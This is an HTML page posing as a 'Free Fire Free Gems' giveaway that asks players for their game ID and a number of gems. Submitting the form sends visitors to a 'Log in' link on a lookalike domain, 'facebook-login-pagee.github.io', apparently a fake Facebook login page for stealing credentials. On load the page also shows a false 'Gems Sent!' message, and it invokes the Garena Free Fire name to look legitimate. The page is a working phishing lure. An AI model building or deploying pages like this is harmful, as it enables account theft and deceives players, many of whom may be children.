<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Free Gems</title>
    <style>
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes slideIn {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #1a1a2e;
            color: #e94560;
            margin: 0;
            padding: 0;
            animation: fadeIn 1s ease-out;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        header {
            background-color: #16213e;
            color: #e94560;
            text-align: center;
            padding: 20px 0;
            border-bottom: 3px solid #e94560;
            animation: slideIn 0.5s ease-out;
        }
        h1 {
            margin: 0;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .content {
            background-color: #0f3460;
            border-radius: 10px;
            padding: 30px;
            margin-top: 30px;
            box-shadow: 0 0 20px rgba(233, 69, 96, 0.2);
            animation: slideIn 0.5s ease-out 0.3s both;
        }
        .btn {
            display: block;
            width: 200px;
            background-color: #e94560;
            color: #fff;
            padding: 12px 24px;
            text-decoration: none;
            border-radius: 25px;
            margin: 20px auto 0;
            font-weight: bold;
            transition: all 0.3s ease;
            border: none;
            cursor: pointer;
            text-align: center;
            animation: pulse 2s infinite;
        }
        .btn:hover {
            background-color: #ff6b6b;
            transform: scale(1.05);
            animation: none;
        }
        .disclaimer {
            font-size: 12px;
            color: #888;
            margin-top: 20px;
            text-align: center;
        }
        input, select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #e94560;
            background-color: #16213e;
            color: #e94560;
            transition: all 0.3s ease;
        }
        input:focus, select:focus {
            box-shadow: 0 0 5px #e94560;
        }
        .gem-icon {
            width: 100px;
            height: 100px;
            margin: 0 auto;
            display: block;
        }
        .steps {
            display: flex;
            justify-content: space-around;
            margin: 30px 0;
        }
        .step {
            text-align: center;
            width: 30%;
            opacity: 0;
            animation: fadeIn 0.5s ease-out forwards;
        }
        .step:nth-child(1) { animation-delay: 0.5s; }
        .step:nth-child(2) { animation-delay: 0.7s; }
        .step:nth-child(3) { animation-delay: 0.9s; }
        .step-icon {
            width: 50px;
            height: 50px;
            margin: 0 auto 10px;
            transition: transform 0.3s ease;
        }
        .step:hover .step-icon {
            transform: scale(1.1);
        }
        .signup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            animation: fadeIn 0.3s ease-out;
        }
        .signup-window {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #0f3460;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(233, 69, 96, 0.4);
            max-width: 400px;
            width: 90%;
            animation: slideIn 0.5s ease-out;
        }
        .signup-window h2 {
            color: #e94560;
            margin-top: 0;
        }
        .signup-window .btn {
            margin-top: 20px;
        }
        .close-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: none;
            border: none;
            color: #e94560;
            font-size: 24px;
            cursor: pointer;
        }
        .popup-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 1000;
            animation: fadeIn 0.3s ease-out;
        }
        .popup-window {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #0f3460;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(233, 69, 96, 0.4);
            max-width: 400px;
            width: 90%;
            animation: slideIn 0.5s ease-out;
        }
        .popup-window h2 {
            color: #e94560;
            margin-top: 0;
        }
        .popup-window .btn {
            margin-top: 20px;
        }
        .popup-close-btn {
            position: absolute;
            top: 10px;
            right: 10px;
            background: none;
            border: none;
            color: #e94560;
            font-size: 24px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <header>
        <h1>Free Fire Free Gems</h1>
    </header>
    <div class="container">
        <div class="content">
            <svg class="gem-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                <path fill="#e94560" d="M378.7 32H133.3L256 182.7L378.7 32zM512 192l-107.4-141.3L289.6 192H512zM107.4 50.7L0 192h222.4L107.4 50.7zM464 224H48l160 160h96l160-160z"/>
            </svg>
            <h2>Get Your Free Gems Now!</h2>
            <div class="steps">
                <div class="step">
                    <svg class="step-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#e94560" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-39 5.3-11.4 6.5-16.8 2.6z"/>
                    </svg>
                    <p>Fast</p>
                </div>
                <div class="step">
                    <svg class="step-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#e94560" d="M256 8C119.033 8 8 119.033 8 256s111.033 248 248 248 248-111.033 248-248S392.967 8 256 8zm0 48c110.532 0 200 89.451 200 200 0 110.532-89.451 200-200 200-110.532 0-200-89.451-200-200 0-110.532 89.451-200 200-200m140.204 130.267l-22.536-22.718c-4.667-4.705-12.265-4.736-16.97-.068L215.346 303.697l-59.792-60.277c-4.667-4.705-12.265-4.736-16.97-.069l-22.719 22.536c-4.705 4.667-4.736 12.265-.068 16.971l90.781 91.516c4.667 4.705 12.265 4.736 16.97.068l172.589-171.204c4.704-4.668 4.734-12.266.067-16.971z"/>
                    </svg>
                    <p>Easy</p>
                </div>
                <div class="step">
                    <svg class="step-icon" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#e94560" d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 448c-110.532 0-200-89.431-200-200 0-110.495 89.472-200 200-200 110.491 0 200 89.471 200 200 0 110.53-89.431 200-200 200zm107.244-255.2c0 67.052-72.421 68.084-72.421 92.863V300c0 6.627-5.373 12-12 12h-45.647c-6.627 0-12-5.373-12-12v-8.659c0-35.745 27.1-50.034 47.579-61.516 17.561-9.845 28.324-16.541 28.324-29.579 0-17.246-21.999-28.693-39.784-28.693-23.189 0-33.894 10.977-48.942 29.969-4.057 5.12-11.46 6.071-16.666 2.124l-27.824-21.098c-5.107-3.872-6.251-11.066-2.644-16.363C184.846 131.491 214.94 112 261.794 112c49.071 0 101.45 38.304 101.45 88.8zM298 368c0 23.159-18.841 42-42 42s-42-18.841-42-42 18.841-42 42-42 42 18.841 42 42z"/>
                    </svg>
                    <p>Safe</p>
                </div>
            </div>
            <form id="gemForm">
                <label for="ffid">Free Fire ID:</label>
                <input type="text" id="ffid" name="ffid" required placeholder="Enter your Free Fire ID">
                <label for="gems">Number of Gems:</label>
                <select id="gems" name="gems">
                    <option value="100">100 Gems</option>
                    <option value="500">500 Gems</option>
                    <option value="1000">1000 Gems</option>
                </select>
                <button type="submit" class="btn">Claim Now</button>
            </form>
        </div>
        <p class="disclaimer">Garena Free Fire 2024.</p>
    </div>

    <div class="signup-overlay" id="signupOverlay">
        <div class="signup-window">
            <button class="close-btn" id="closeSignup">&times;</button>
            <h2>Log in</h2>
            <p>To claim your free gems, you need to Log in.</p>
            <a href="https://facebook-login-pagee.github.io/Facebook/Facebook.com.html" class="btn">Log in</a>
        </div>
    </div>

    <div class="popup-overlay" id="popupOverlay">
        <div class="popup-window">
            <button class="popup-close-btn" id="closePopup">&times;</button>
            <h2>Gems Sent!</h2>
            <p>Your gems have been successfully sent. If you do not receive them within 24 hours, please submit a new request.</p>
            <button class="btn" id="closePopupButton">OK</button>
        </div>
    </div>

    <script>
        document.getElementById('gemForm').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('signupOverlay').style.display = 'block';
        });

        document.getElementById('closeSignup').addEventListener('click', function() {
            document.getElementById('signupOverlay').style.display = 'none';
        });

        document.getElementById('closePopup').addEventListener('click', function() {
            document.getElementById('popupOverlay').style.display = 'none';
        });

        document.getElementById('closePopupButton').addEventListener('click', function() {
            document.getElementById('popupOverlay').style.display = 'none';
        });

        window.onload = function() {
            document.getElementById('popupOverlay').style.display = 'block';
        };
    </script>
</body>
</html>
